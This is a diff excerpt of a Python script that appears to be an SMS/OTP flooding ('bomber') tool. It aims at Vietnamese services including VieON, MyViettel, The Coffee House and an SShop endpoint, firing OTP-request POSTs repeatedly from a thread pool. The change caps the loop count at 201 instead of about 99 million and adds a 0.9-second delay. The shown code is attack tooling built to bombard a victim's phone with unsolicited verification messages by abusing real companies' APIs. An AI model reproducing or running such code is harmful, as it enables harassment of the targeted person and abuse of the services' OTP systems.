@@ -124,8 +124,8 @@ def vieon():
     except requests.exceptions.RequestException:
         print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-if count > 9998888:
-    count = 99999989
+if count > 200:
+    count = 201
 
 def myviettel():
     headers = {
@@ -1263,7 +1263,7 @@ def thecoffeehouse():
             'region_code': '+84',
         },
     }
-
+    
     try:
         response = requests.post('https://api.thecoffeehouse.com/api/v5/auth/request-otp', cookies=cookies, headers=headers, json=json_data)
         response.raise_for_status()  # Raise an exception for HTTP errors
@@ -2881,7 +2881,7 @@ def sfin(): #ap \sshop\ CHECK
         'appId': 'SSHOP',
         'languageCode': 'vi',
     }
-
+    
     try:
         response = requests.post('https://proapi.sspa.com.vn/auth/v2/otp/generate-v2', headers=headers, json=json_data)
         response.raise_for_status()
@@ -3336,4 +3336,4 @@ with concurrent.futures.ThreadPoolExecutor() as executor:
     for i in range(count):
         for func in functions:
             executor.submit(func)
-            time.sleep(0)
+            time.sleep(0.9)
